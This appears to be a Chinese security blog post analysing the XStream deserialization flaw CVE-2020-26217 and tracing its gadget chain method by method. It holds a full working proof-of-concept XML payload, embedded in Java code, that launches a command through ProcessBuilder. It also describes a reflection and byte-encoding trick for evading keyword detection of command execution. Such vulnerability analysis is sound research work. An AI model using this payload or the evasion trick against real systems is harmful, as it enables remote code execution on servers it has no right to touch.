---
layout:     post
title:      CVE-2020-26217漏洞分析
subtitle:   Xstream反序列化漏洞
date:       2020-12-28
author:     heria
header-img: img/post-bg-github-cup.jpg
catalog: true
tags:
---



## 0X01简介

XStream是Java类库，用来将对象序列化成XML （JSON）或反序列化为对象。

**也就是说，使用XStream，我们可以把Java对象转换成XML，也可以将XML转换为Java对象。**

2020年，Xstream有两个影响比较大的高危漏洞被爆出：CVE-2020-26217远程代码执行漏洞与CVE-2020-26259任意文件删除漏洞。

## 0X02分析

首先把CVE-2020-26217与CVE-2020-26259的poc放到一起比较下：

![image-20201228142116945](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201228142116945.png)

从上图两个漏洞poc的对比上来看：二者利用链前半部分都是一样的，只有中间is元素的class属性值不同：其中一个为java.io.SequenceInputStream而另一个为com.sun.xml.internal.ws.util.ReadAllStream$FileStream。

由于poc是个xml格式，我们一层层来剖析这个xml。首先把poc元素折叠起来，看看entry元素中包含的元素内容，见下图

![image-20201228142201389](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201228142201389.png)

entry元素中包含了jdk.nashorn.internal.objects.NativeString与string两个元素

```
import com.thoughtworks.xstream.XStream;
import java.util.HashMap;
import java.util.Map;

class Person{
    String name;
    int age;
    public Person(String name,int age){
        this.name=name;
        this.age=age;
    }
}

public class demo{
    public static void main(String[] args){
        Map map=new HashMap();
        map.put(new Person( "heria",18),"test");
        XStream xstream=new XStream();
        String xml=xstream.toXML(map);
        System.out.println(xml);
    }
}
```



![image-20201228143951139](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201228143951139.png)



从我们的demo与实际poc两个例子可以看出：在Xstream将Map生成xml格式数据时，会为每个Entry对象生成一个<entry>…</entry>元素，并将该Entry中的key与value作为其子元素顺次放置于其中第一个和第二个元素处。因此我们可以通过这个特点推断出，poc中jdk.nashorn.internal.objects.NativeString与string两个元素其实就是该Entry的key与value

从上图可见：在生成xml时，我们为Person对象赋值的name与age属性值成为了Person对象节点(<person>…</person>)的子元素(<name>…</name>、<age>…</age>)

因此可以推断，当一个java对象通过Xstream生成xml时，其结构应遵循如下结构

![image-20201228144553486](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201228144553486.png)

回头看一下我们的poc，我们再展开一级看看

![image-20201228144643861](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201228144643861.png)

通过上文的理解，上图poc可以理解为一个map集合，其中存在key为jdk.nashorn.internal.objects.NativeString对象、value值为test的Entry。而jdk.nashorn.internal.objects.NativeString对象又存在flags、value属性，它的flags属性值为0、value属性值为com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data



## 0X03CVE-2020-26217复现

![image-20201228152730941](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201228152730941.png)

```
import com.thoughtworks.xstream.XStream;
public class Xstream {
    public static void main(String[] args) {
        String ssrf_xml = "<map>\n" +
                "  <entry>\n" +
                "    <jdk.nashorn.internal.objects.NativeString>\n" +
                "      <flags>0</flags>\n" +
                "      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>\n" +
                "        <dataHandler>\n" +
                "          <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>\n" +
                "            <contentType>text/plain</contentType>\n" +
                "            <is class='java.io.SequenceInputStream'>\n" +
                "              <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>\n" +
                "                <iterator class='javax.imageio.spi.FilterIterator'>\n" +
                "                  <iter class='java.util.ArrayList$Itr'>\n" +
                "                    <cursor>0</cursor>\n" +
                "                    <lastRet>-1</lastRet>\n" +
                "                    <expectedModCount>1</expectedModCount>\n" +
                "                    <outer-class>\n" +
                "                      <java.lang.ProcessBuilder>\n" +
                "                        <command>\n" +
                "                          <string>calc</string>\n" +
                "                        </command>\n" +
                "                      </java.lang.ProcessBuilder>\n" +
                "                    </outer-class>\n" +
                "                  </iter>\n" +
                "                  <filter class='javax.imageio.ImageIO$ContainsFilter'>\n" +
                "                    <method>\n" +
                "                      <class>java.lang.ProcessBuilder</class>\n" +
                "                      <name>start</name>\n" +
                "                      <parameter-types/>\n" +
                "                    </method>\n" +
                "                    <name>start</name>\n" +
                "                  </filter>\n" +
                "                  <next/>\n" +
                "                </iterator>\n" +
                "                <type>KEYS</type>\n" +
                "              </e>\n" +
                "              <in class='java.io.ByteArrayInputStream'>\n" +
                "                <buf></buf>\n" +
                "                <pos>0</pos>\n" +
                "                <mark>0</mark>\n" +
                "                <count>0</count>\n" +
                "              </in>\n" +
                "            </is>\n" +
                "            <consumed>false</consumed>\n" +
                "          </dataSource>\n" +
                "          <transferFlavors/>\n" +
                "        </dataHandler>\n" +
                "        <dataLen>0</dataLen>\n" +
                "      </value>\n" +
                "    </jdk.nashorn.internal.objects.NativeString>\n" +
                "    <string>test</string>\n" +
                "  </entry>\n" +
                "</map>";
        XStream xstream = new XStream();
        xstream.fromXML(ssrf_xml);
    }
}
```

## 0X04CVE-2020-26217分析

根据map的原理可知：map在put key操作时需要获取key的hash值。因此程序调用了jdk.nashorn.internal.objects.NativeString的hashCode方法，见下图

![image-20201228152711083](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201228152711083.png)

![image-20201228152850078](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201228152850078.png)

从上图可见，程序调用了getStringValue方法，我们跟入这个方法，见下图

![image-20201228173247057](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201228173247057.png)

在这个方法中，程序将判断this.value是否为String实例，并尝试调用this.value.toString方法

经过上文对poc的分析，此时的this.value其实就是</jdk.nashorn.internal.objects.NativeString>元素中的value子元素值，攻击者可以通过xml中NativeString元素的value子元素控制。在官方给出的poc中，将value值构造为com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data类。

![image-20201228153300997](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201228153300997.png)

因此，此时this.value为com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data。程序调用Base64Data类的toString方法，见下图

![image-20201228153538077](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201228153538077.png)

Base64Data类中toString方法首先调用了其自身的get方法，跟入get方法中，见下图：

![image-20201228153744196](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201228153744196.png)

分析上图代码：this.dataHandler.getDataSource().getInputStream();将其拆分来看：

![image-20201228154004186](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201228154004186.png)

1. 首先程序执行this.dataHandler.getDataSource()，即是获取Base64Data对象中dataHandler属性的DataSource值。Base64Data的dataHandler属性值以及dataHandler的dataSource属性值都可以在xml中设置。poc中将dataSource设置为：com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource。因此this.dataHandler.getDataSource()获取的值为：com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource
2. 随后程序执行com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource类的getInputStream方法，这将获取com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSourc的is属性值

![image-20201228154238573](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201228154238573.png)

CVE-2020-26217 的poc中DataSource元素包含的is元素是java.io.SequenceInputStream

重新下断点，随后，程序将is变量传入readFrom方法中

![image-20201228155549671](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201228155549671.png)

![image-20201228155656749](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201228155656749.png)

此时的is变量为java.io.SequenceInputStream，随后程序调用java.io.SequenceInputStream类的read方法

![image-20201228160029285](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201228160029285.png)

从上图可见，程序将调用java.io.SequenceInputStream类的read方法中的nextStream方法，跟入nextStream方法中，见下图

![image-20201228160300911](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201228160300911.png)

从上图110行可见，程序将执行in = (InputStream) e.nextElement();

而e的值，可以通过向xml中SequenceInputStream元素中的e元素值来控制。在poc中将这个e元素值设置为javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator

![image-20201228160323297](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201228160323297.png)

因此，程序事实上调用的是javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator的nextElement方法。接下来进入位于javax/swing/MultiUIDefaults.java中的nextElement方法。

![image-20201228160637927](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201228160637927.png)

可见，这次需要执行的是iterator.next().getKey();

我们需要为javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator对象构造一个满足要求的iterator属性值。通过分析poc可知，poc中选取了javax.imageio.spi.FilterIterator作为iterator属性值，见下图

![image-20201228160851918](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201228160851918.png)

跟入位于javax/imageio/spi/ServiceRegistry.java的javax.imageio.spi.FilterIterator类的next方法

![image-20201228161114401](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201228161114401.png)

在javax.imageio.spi.FilterIterator类的next方法中，执行advance方法。跟入advance方法

![image-20201228161229828](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201228161229828.png)

从上图可见，程序执行了T elt = iter.next();
此时的iter显然可以通过xml中javax.imageio.spi.FilterIterator元素中iter元素控制，我们看一下poc中构造的iter子节点，见下图

![image-20201228161338091](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201228161338091.png)

当iter.next()执行后，poc中构造的java.lang.ProcessBuilder被返回并赋值给elt，见下图

![image-20201228161731765](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201228161731765.png)

很显然，filter值是可以通过xml中javax.imageio.spi.FilterIterator元素中filter元素控制的

![image-20201228162809734](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201228162809734.png)

Filter赋值为javax.imageio.ImageIO$ContainsFilter类

我们跟入javax.imageio.ImageIO$ContainsFilter类的filter方法中，位于javax/imageio/ImageIO.java

![image-20201228163047985](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201228163047985.png)

可见在javax.imageio.ImageIO$ContainsFilter类的filter方法中，执行了method.invoke(elt)。method可以通过xml中javax.imageio.ImageIO$ContainsFilter元素包含的method元素控制

![image-20201228163208571](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201228163208571.png)

此时method为ProcessBuilder类的start方法，而通过上文可知：elt为构造好的java.lang.ProcessBuilder对象。在method与elt都可控的情况下，进行反射调用即可实现远程代码执行利用。



## 0X05 JAVA INVOKE

JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。

**java反射bypass**

针对关键字，关键函数的检测，java中可利用反射来进行bypass关键字

比如通过反射加载命令执行的类，加载完成后进行传入我们需要的命令，即可进行绕过exec()这样的正则关键字。

基础的反射执行命令——>通过Class.forName加载Runtime类，获取到runtime对象，接着进行invoke执行exec方法。

![image-20201020143228656](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201020143228656.png)

**java byte字节码+反射bypass**

上述完成了基础的反射Runtime类执行exec命令，那如何做到毫无runtime，exec等关键字呢，答案是使用byte字节码+反射的方式进行bypass。对关键字使用byte字节码表示，然后反射执行，几乎不会留下任何关键字。

![image-20201020145817353](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201020145817353.png)

![image-20201020150448587](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201020150448587.png)

## 0X06总结

xstream fromxml(）（内容可控）

map在put key操作时需要获取key的hash值（key,value可控)

调用了jdk.nashorn.internal.objects.NativeString的hashCode方法

调用了getStringValue方法

判断this.value是否为String实例，并尝试调用this.value.toString方法(this,value可控：com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data)

调用Base64Data类的toString方法

toString方法首先调用了其自身的get方法

调用this.dataHandler.getDataSource().getInputStream()

获取Base64Data对象中dataHandler属性的DataSource值(可控：com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource)

获取com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSourc的is属性值(可控：java.io.SequenceInputStream)

程序将is变量传入readFrom方法

调用传入类的read方法

调用read方法中的nextStream方法

程序将执行in = (InputStream) e.nextElement()(e可控：javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerato)

实际上调用的是javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator的nextElement方法

nextElement中执行iterator.next().getKey()（iterator可控：javax.imageio.spi.FilterIterator）

next中执行advance()

elt = iter.next()(iter可控->elt可控：java.lang.ProcessBuilder)

filter.filter(elt)(filter可控：javax.imageio.ImageIO$ContainsFilter)

javax.imageio.ImageIO$ContainsFilter类的filter方法中，执行了method.invoke(elt)(invoke的类方法参数皆可控，造成命令执行)





## 0x07参考链接

https://xz.aliyun.com/t/8694